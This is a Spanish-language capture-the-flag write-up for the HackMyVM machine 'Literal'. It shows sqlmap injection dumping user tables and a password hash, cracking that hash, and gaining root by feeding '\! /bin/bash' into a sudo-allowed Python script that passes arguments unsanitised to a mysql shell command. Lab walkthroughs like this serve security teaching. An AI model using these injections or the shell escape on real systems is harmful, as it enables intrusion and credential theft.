<!DOCTYPE html>
<html lang="es"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">HackMyVM - Literal | noname</title>
<meta property="og:title" content="HackMyVM - Literal | noname" />
<meta name="twitter:title" content="HackMyVM - Literal | noname" />
<meta itemprop="name" content="HackMyVM - Literal | noname" />
<meta name="application-name" content="HackMyVM - Literal | noname" />
<meta property="og:site_name" content="" />

<meta name="description" content="">
<meta itemprop="description" content="" />
<meta property="og:description" content="" />
<meta name="twitter:description" content="" />

<meta property="og:locale" content="es" />
<meta name="language" content="es" />

  <link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/hmv/literal/" title="" />



  <meta itemprop="image" content="http://localhost:1313/" />
  <meta property="og:image" content="http://localhost:1313/" />
  <meta name="twitter:image" content="http://localhost:1313/" />
  <meta name="twitter:image:src" content="http://localhost:1313/" />




    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2023-04-23T19:20:23&#43;0200 />
    <meta property="article:published_time" content=2023-04-23T19:20:23&#43;0200 />

    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "HackMyVM - Literal",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2023-04-23",
        "description": "",
        "wordCount":  1022 ,
        "mainEntityOfPage": "True",
        "dateModified": "2023-04-23",
        "image": {
        "@type": "imageObject",
        "url": ""
        },
        "publisher": {
        "@type": "Organization",
        "name": "noname"
        }
    }
    </script>

<meta name="generator" content="Hugo 0.125.7">

    

    <link rel="canonical" href="http://localhost:1313/writeups/hmv/literal/">
    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="http://localhost:1313/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    </head>
<body data-theme = "" class="notransition">

<script src="/js/theme.js"></script>

<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="http://localhost:1313/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title></title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        $ home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackmyvm/">
                        $ hmv
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackthebox/">
                        $ htb
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/vulnyx/">
                        $ nyx
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/whoami/">
                        $ whoami
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
                
                
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">HackMyVM - Literal</h1>
                
                
                <div class="post-meta">
                    <time datetime="2023-04-23T19:20:23&#43;02:00" itemprop="datePublished"> Apr 23, 2023 </time>
                </div>
                
            </header>
            
            <div class="page-content">
                <p><img src="/../machines/hmv/literal/literal_logo.png" alt="logo"></p>
<ul>
<li><em>SQL injection</em></li>
<li><em>Hash Cracking</em></li>
<li><em>sudo abuse python script</em></li>
</ul>
<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -p- -T5 -v -n 192.168.1.14
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp open  ssh
</span></span><span class="line"><span class="cl">80/tcp open  http
</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -sVC -v -p 22,80 192.168.1.14
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
</span></span><span class="line"><span class="cl">| ssh-hostkey: 
</span></span><span class="line"><span class="cl">|   3072 30ca559468338b5042f4c2b5139966fe (RSA)
</span></span><span class="line"><span class="cl">|   256 2db05e6b96bd0be314fbe0d058845085 (ECDSA)
</span></span><span class="line"><span class="cl">|_  256 92d92a5d6f58db8556d60c9968b85964 (ED25519)
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.41
</span></span><span class="line"><span class="cl">|_http-title: Did not follow redirect to http://blog.literal.hmv
</span></span><span class="line"><span class="cl">| http-methods: 
</span></span><span class="line"><span class="cl">|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.41 (Ubuntu)
</span></span><span class="line"><span class="cl">Service Info: Host: blog.literal.hmv; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><h3 id="http">HTTP</h3>
<p>Si intento ir a la web me redirige automáticamente al subdominio <code>blog.literal.hmv</code>.</p>
<p><img src="/../machines/hmv/literal/puerto80.png" alt="puerto80"></p>
<p>Añado el subdominio al archivo hosts de mi equipo y me conecto de nuevo a la web.</p>
<p><img src="/../machines/hmv/literal/blog.png" alt="blog"></p>
<p>Me voy a login, creo un usuario y me logueo.</p>
<p><img src="/../machines/hmv/literal/hi_noname.png" alt="hi_noname"></p>
<p>Hago click en <code>Check what projects I'm working on</code> y veo una lista.</p>
<p><img src="/../machines/hmv/literal/noname_next_projects.png" alt="noname_next_projects"></p>
<p>Después de interceptar la petición con burpsuite la guardo a un fichero con <code>copy to file</code> y le doy el nombre de burp.</p>
<p><img src="/../machines/hmv/literal/burpcaptura.png" alt="puerto80"></p>
<p>Ahora utilizo el fichero que he guardado anteriormente para usarlo con sqlmap y buscar el nombre de la base de datos.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ sqlmap -r burp --level 5 --risk 3 --dbs
</span></span><span class="line"><span class="cl">[20:27:45] [INFO] fetching database names
</span></span><span class="line"><span class="cl">available databases [4]:
</span></span><span class="line"><span class="cl">[*] blog
</span></span><span class="line"><span class="cl">[*] information_schema
</span></span><span class="line"><span class="cl">[*] mysql
</span></span><span class="line"><span class="cl">[*] performance_schema
</span></span></code></pre></div><p>Buscando las tablas de blog.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ sqlmap -r burp --level 5 --risk 3 -D blog --tables
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[20:31:17] [INFO] fetching tables for database: &#39;blog&#39;
</span></span><span class="line"><span class="cl">Database: blog
</span></span><span class="line"><span class="cl">[2 tables]
</span></span><span class="line"><span class="cl">+----------+
</span></span><span class="line"><span class="cl">| projects |
</span></span><span class="line"><span class="cl">| users    |
</span></span><span class="line"><span class="cl">+----------+
</span></span></code></pre></div><p>Dumpeando users.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ sqlmap -r burp --level 5 --risk 3 -D blog -T users --dump
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">dump_db_blog
</span></span></code></pre></div><p>Encuentro dos usuarios con un nuevo subdominio.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">| 8      | walter    | walter@forumtesting.literal.hmv
</span></span><span class="line"><span class="cl">| 11     | r1ch4rd   | r1ch4rd@forumtesting.literal.hmv
</span></span></code></pre></div><p>Añado el subdominio a mi archivo hosts y me conecto a el.</p>
<p><img src="/../machines/hmv/literal/forumtesting.png" alt="forumtesting"></p>
<p>Le doy click a categories y veo el parámetro <strong><em>category_id=2</em></strong>.</p>
<p><img src="/../machines/hmv/literal/forumtesting_category.png" alt="forumtesting_category"></p>
<p>Encuentro la base de datos <code>forumtesting</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sqlmap -u &#34;http://forumtesting.literal.hmv/category.php?category_id=2&#34; 
</span></span><span class="line"><span class="cl">--level 5 --risk 3 --dbs
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[21:01:30] [INFO] retrieved: forumtesting
</span></span><span class="line"><span class="cl">available databases [3]:
</span></span><span class="line"><span class="cl">[*] forumtesting
</span></span><span class="line"><span class="cl">[*] information_schema
</span></span><span class="line"><span class="cl">[*] performance_schema
</span></span></code></pre></div><p>Obtengo las tablas.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ sqlmap -u &#34;http://forumtesting.literal.hmv/category.php?category_id=2&#34; --level 5 --risk 3 -D forumtesting --tables
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[21:04:36] [INFO] retrieved: forum_users
</span></span><span class="line"><span class="cl">Database: forumtesting
</span></span><span class="line"><span class="cl">[5 tables]
</span></span><span class="line"><span class="cl">+----------------+
</span></span><span class="line"><span class="cl">| forum_category |
</span></span><span class="line"><span class="cl">| forum_owner    |
</span></span><span class="line"><span class="cl">| forum_posts    |
</span></span><span class="line"><span class="cl">| forum_topics   |
</span></span><span class="line"><span class="cl">| forum_users    |
</span></span><span class="line"><span class="cl">+----------------+
</span></span></code></pre></div><p>Dumpeo <code>forum_owner</code> y obtengo un hash para carlos.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ sqlmap -u &#34;http://forumtesting.literal.hmv/category.php?category_id=2&#34; --level 5 --risk 3 -D forumtesting -T forum_owner --dump
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[21:07:43] [INFO] retrieved: 2022-02-12
</span></span><span class="line"><span class="cl">[21:07:43] [INFO] retrieved: carlos@forumtesting.literal.htb
</span></span><span class="line"><span class="cl">[21:07:44] [INFO] retrieved: 1
</span></span><span class="line"><span class="cl">[21:07:44] [INFO] retrieved: 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99
</span></span><span class="line"><span class="cl">[21:07:49] [INFO] retrieved: carlos
</span></span><span class="line"><span class="cl">[21:07:49] [INFO] recognized possible password hashes in column &#39;password&#39;
</span></span></code></pre></div><p>Para romper el hash usaré el mismo <code>sqlmap</code> ya que nos ofrece esa opción y es bastante intuitivo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
</span></span><span class="line"><span class="cl">[21:14:27] [INFO] writing hashes to a temporary file &#39;/tmp/sqlmaps0oti3_q65473/sqlmaphashes-9njg5mis.txt&#39; 
</span></span><span class="line"><span class="cl">do you want to crack them via a dictionary-based attack? [Y/n/q] y
</span></span><span class="line"><span class="cl">[21:14:28] [INFO] using hash method &#39;sha512_generic_passwd&#39;
</span></span><span class="line"><span class="cl">what dictionary do you want to use?
</span></span><span class="line"><span class="cl">[1] default dictionary file &#39;/usr/share/sqlmap/data/txt/wordlist.tx_&#39; (press Enter)
</span></span><span class="line"><span class="cl">[2] custom dictionary file
</span></span><span class="line"><span class="cl">[3] file with list of dictionary files
</span></span><span class="line"><span class="cl">&gt; 2
</span></span><span class="line"><span class="cl">what&#39;s the custom dictionary&#39;s location?
</span></span><span class="line"><span class="cl">&gt; /usr/share/wordlists/rockyou.txt
</span></span><span class="line"><span class="cl">[21:14:46] [INFO] using custom dictionary
</span></span><span class="line"><span class="cl">do you want to use common password suffixes? (slow!) [y/N] n
</span></span><span class="line"><span class="cl">[21:14:51] [INFO] starting dictionary-based cracking (sha512_generic_passwd)
</span></span><span class="line"><span class="cl">[21:14:51] [INFO] starting 4 processes 
</span></span><span class="line"><span class="cl">[21:15:13] [INFO] cracked password &#39;forum******&#39; for user &#39;carlos&#39;
</span></span></code></pre></div><hr>
<blockquote>
<p>Este paso es un poco troll porque una vez obtienes la contraseña hay que deducir que formato tendría la contraseña para SSH. Digamos que se puede reutilizar pero cambiando algunos carácteres.</p>
</blockquote>
<p>Me conecto al sistema y verifico que permisos tengo con sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">carlos@literal:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries for carlos on literal:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">User carlos may run the following commands on literal:
</span></span><span class="line"><span class="cl">    (root) NOPASSWD: /opt/my_things/blog/update_project_status.py *
</span></span></code></pre></div><p>Archivo <code>update_project_status.py</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Learning python3 to update my project status</span>
</span></span><span class="line"><span class="cl"><span class="c1">## (mental note: This is important, so administrator is my safe to avoid upgrading records by mistake) :P</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">References:
</span></span></span><span class="line"><span class="cl"><span class="s1">* MySQL commands in Linux: https://www.shellhacks.com/mysql-run-query-bash-script-linux-command-line/
</span></span></span><span class="line"><span class="cl"><span class="s1">* Shell commands in Python: https://stackabuse.com/executing-shell-commands-with-python/
</span></span></span><span class="line"><span class="cl"><span class="s1">* Functions: https://www.tutorialspoint.com/python3/python_functions.htm
</span></span></span><span class="line"><span class="cl"><span class="s1">* Arguments: https://www.knowledgehut.com/blog/programming/sys-argv-python-examples
</span></span></span><span class="line"><span class="cl"><span class="s1">* Array validation: https://stackoverflow.com/questions/7571635/fastest-way-to-check-if-a-value-exists-in-a-list
</span></span></span><span class="line"><span class="cl"><span class="s1">* Valid if root is running the script: https://stackoverflow.com/questions/2806897/what-is-the-best-way-for-checking-if-the-user-of-a-script-has-root-like-privileg
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">date</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="c1"># Functions ------------------------------------------------.</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">execute_query</span><span class="p">(</span><span class="n">sql</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;mysql -u &#34;</span> <span class="o">+</span> <span class="n">db_user</span> <span class="o">+</span> <span class="s2">&#34; -D &#34;</span> <span class="o">+</span> <span class="n">db_name</span> <span class="o">+</span> <span class="s2">&#34; -e </span><span class="se">\&#34;</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">sql</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\&#34;</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="c1"># Query all rows</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">query_all</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM projects;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">execute_query</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="c1"># Query row by ID</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">query_by_id</span><span class="p">(</span><span class="n">arg_project_id</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM projects WHERE proid = &#34;</span> <span class="o">+</span> <span class="n">arg_project_id</span> <span class="o">+</span> <span class="s2">&#34;;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">execute_query</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="c1"># Update database</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">update_status</span><span class="p">(</span><span class="n">enddate</span><span class="p">,</span> <span class="n">arg_project_id</span><span class="p">,</span> <span class="n">arg_project_status</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">enddate</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">sql</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;UPDATE projects SET prodateend = &#39;&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">enddate</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;&#39;, prostatus = &#39;&#34;</span> <span class="o">+</span> <span class="n">arg_project_status</span> <span class="o">+</span> <span class="s2">&#34;&#39; WHERE proid = &#39;&#34;</span> <span class="o">+</span> <span class="n">arg_project_id</span> <span class="o">+</span> <span class="s2">&#34;&#39;;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">sql</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;UPDATE projects SET prodateend = &#39;2222-12-12&#39;, prostatus = &#39;&#34;</span> <span class="o">+</span> <span class="n">arg_project_status</span> <span class="o">+</span> <span class="s2">&#34;&#39; WHERE proid = &#39;&#34;</span> <span class="o">+</span> <span class="n">arg_project_id</span> <span class="o">+</span> <span class="s2">&#34;&#39;;&#34;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">execute_query</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="c1"># Main program</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Fast validation</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">arg_project_id</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">arg_project_id</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">arg_project_status</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">arg_project_status</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">arg_project_id</span> <span class="ow">and</span> <span class="n">arg_project_status</span><span class="p">:</span> <span class="c1"># To update</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Avoid update by error</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">geteuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">array_status</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;Done&#34;</span><span class="p">,</span> <span class="s2">&#34;Doing&#34;</span><span class="p">,</span> <span class="s2">&#34;To do&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">arg_project_status</span> <span class="ow">in</span> <span class="n">array_status</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Before update project (&#34;</span> <span class="o">+</span> <span class="n">arg_project_id</span> <span class="o">+</span> <span class="s2">&#34;)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">query_by_id</span><span class="p">(</span><span class="n">arg_project_id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">arg_project_status</span> <span class="o">==</span> <span class="s1">&#39;Done&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">update_status</span><span class="p">(</span><span class="n">date</span><span class="o">.</span><span class="n">today</span><span class="p">(),</span> <span class="n">arg_project_id</span><span class="p">,</span> <span class="n">arg_project_status</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">update_status</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">arg_project_id</span><span class="p">,</span> <span class="n">arg_project_status</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Bro, avoid a fail: Done - Doing - To do&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] New status of project (&#34;</span> <span class="o">+</span> <span class="n">arg_project_id</span> <span class="o">+</span> <span class="s2">&#34;)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">query_by_id</span><span class="p">(</span><span class="n">arg_project_id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Ejejeeey, avoid mistakes!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">arg_project_id</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">query_by_id</span><span class="p">(</span><span class="n">arg_project_id</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">query_all</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="c1"># Variables ------------------------------------------------.</span>
</span></span><span class="line"><span class="cl"><span class="n">db_user</span> <span class="o">=</span> <span class="s2">&#34;carlos&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">db_name</span> <span class="o">=</span> <span class="s2">&#34;blog&#34;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="c1"># Main program</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><p>Obtengo el root de la siguiente forma.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">carlos@literal:~$ sudo /opt/my_things/blog/update_project_status.py &#39;\! /bin/bash&#39; &#39;To do&#39;
</span></span><span class="line"><span class="cl">[+] Before update project (\! /bin/bash)
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">root@literal:/home/carlos# id;hostname
</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root) groups=0(root)
</span></span></code></pre></div><hr>
<blockquote>
<p>Si se lanza el script con esos parámetros, el programa intentará actualizar el estado de un proyecto con el ID &ldquo;!/bin/bash&rdquo; y el estado &ldquo;To do&rdquo;. Además el programa también comprueba que el usuario que ejecuta el script tenga permisos de root. Si se ejecuta con &ldquo;sudo&rdquo;, esto se cumplirá.</p>
</blockquote>
<p>Y con esto resolvemos la máquina Literal.</p>

            </div>
        </article></main>
</div>
<footer class="footer">
    <span class="footer_item"> </span>
    &nbsp;

    <div class="footer_social-icons">
<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
    title="Github">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
